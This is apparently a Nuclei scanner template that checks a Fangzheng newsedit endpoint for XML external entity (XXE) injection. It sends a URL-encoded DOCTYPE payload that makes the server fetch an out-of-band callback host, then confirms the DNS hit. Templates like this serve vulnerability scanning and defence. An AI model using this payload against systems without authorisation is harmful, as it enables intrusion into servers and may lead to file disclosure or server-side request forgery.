id: fangzheng-addOrUpdateOrg-xxe

info:
  name: fangzheng-addOrUpdateOrg-xxe
  author: fangzheng-addOrUpdateOrg-xxe
  severity: high

http:
  - raw:
      - |
        POST /newsedit/api/orgUser/addOrUpdateOrg HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: gzip
        Connection: close
        Content-Type: application/x-www-form-urlencoded
        User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36

        xmlStr=%3C!DOCTYPE%20root%20%5B%20%3C!ENTITY%20%25%20remote%20SYSTEM%20%22http://{{interactsh-url}}%22%3E%20%25remote;%5D%3E

    matchers:
      - type: word
        part: interactsh_protocol # Confirms the DNS Interaction
        words:
          - "dns"